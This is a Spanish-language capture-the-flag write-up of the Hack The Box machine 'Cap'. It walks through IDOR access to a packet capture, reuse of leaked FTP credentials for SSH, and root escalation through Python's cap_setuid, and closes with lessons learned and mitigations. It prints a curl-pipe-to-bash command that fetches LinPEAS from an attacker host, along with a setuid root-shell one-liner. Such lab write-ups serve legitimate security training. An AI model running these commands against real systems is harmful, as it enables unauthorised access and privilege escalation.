# Cap — Hack The Box

**Plataforma:** Hack The Box — Machines  
**Dificultad:** Easy  
**SO:** Linux  
**Categoría:** Web / Network Analysis / Privilege Escalation  
**Estado:** ✅ Pwned

---

## Resumen

Máquina Linux con un dashboard web de monitorización de red. La vulnerabilidad principal
es un IDOR (Insecure Direct Object Reference) que permite acceder a capturas de tráfico
de otros usuarios. Uno de esos archivos PCAP contiene credenciales FTP en texto claro
que también funcionan para SSH. La escalada de privilegios se consigue mediante Linux
Capabilities mal configuradas en Python 3.8.

---

## Reconocimiento

```bash
nmap -sV -sC (IP)
```

Resultado relevante:
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd

22/tcp open  ssh     OpenSSH

80/tcp open  http    gunicorn

Tres servicios activos: FTP, SSH y un servidor web.

---

## Enumeración

### Dashboard web — IDOR

Al acceder al puerto 80 aparece un dashboard de seguridad de red con capturas de
tráfico descargables. La URL sigue el patrón:
http://(IP)/data/1

Cambiando el número se accede a capturas de otros usuarios sin ningún tipo de
validación — IDOR clásico. La captura con ID `0` contiene tráfico sensible:
http://(IP)/data/0

Se descarga `0.pcap` y se analiza con Wireshark.

### Análisis del PCAP con Wireshark

Filtrando por protocolo FTP:
ftp

En los paquetes `USER` y `PASS` se encuentran credenciales en texto claro:
Usuario: nathan

Contraseña: Buck3txxxxxxxxx

FTP transmite las credenciales sin cifrar, lo que permite interceptarlas con una
simple captura de red.

---

## Explotación — Acceso inicial

Las credenciales de FTP se reutilizan para SSH:

```bash
ssh nathan@(IP-víctima)
```

Contraseña: `Buck3txxxxxxxxx`

Acceso conseguido como usuario `nathan`.

### User Flag

```bash
cat ~/user.txt
```

---

## Escalada de Privilegios — Linux Capabilities

### Enumeración con LinPEAS

Desde la máquina atacante se sirve LinPEAS por HTTP:

```bash
python3 -m http.server 80
```

Desde la máquina víctima se descarga y ejecuta:

```bash
curl http://(IP-atacante)/linpeas.sh | bash
```

LinPEAS detecta capabilities especiales asignadas a binarios del sistema.

### Capabilities peligrosas

```bash
getcap -r / 2>/dev/null
```

Resultado relevante:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

`cap_setuid` permite a Python cambiar su UID a 0 (root) sin necesitar contraseña
ni sudo.

### Explotación

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Verificación:

```bash
id
# uid=0(root) gid=1000(nathan) groups=1000(nathan)
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Lecciones aprendidas

- **IDOR:** cambiar un número en la URL puede dar acceso a datos de otros usuarios si el backend no valida permisos por sesión.
- **FTP sin cifrar:** las credenciales FTP viajan en texto plano y son visibles en cualquier captura de red. Siempre usar SFTP o FTPS.
- **Reutilización de contraseñas:** una contraseña filtrada en FTP funcionó también para SSH. Una credencial comprometida expone todos los servicios donde se reutilice.
- **Linux Capabilities:** alternativa a SUID más granular pero igualmente peligrosa si se configura mal. `cap_setuid` en un intérprete como Python es escalada de privilegios trivial.
- **LinPEAS:** herramienta clave para automatizar la enumeración de vectores de escalada en Linux.

---

## Mitigación

- Validar en el backend que el usuario autenticado solo pueda acceder a sus propios recursos.
- Sustituir FTP por SFTP — las credenciales nunca deben viajar en texto plano.
- No reutilizar contraseñas entre servicios.
- No asignar `cap_setuid` a intérpretes de scripting como Python.

---

## Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| Nmap | Escaneo de puertos y servicios |
| Wireshark | Análisis del archivo PCAP |
| LinPEAS | Enumeración de vectores de escalada |
| Python 3.8 (cap_setuid) | Escalada a root |
| SSH | Acceso inicial a la máquina |

---

*Parte del camino hacia la certificación eJPT — documentando el progreso desde cero.*
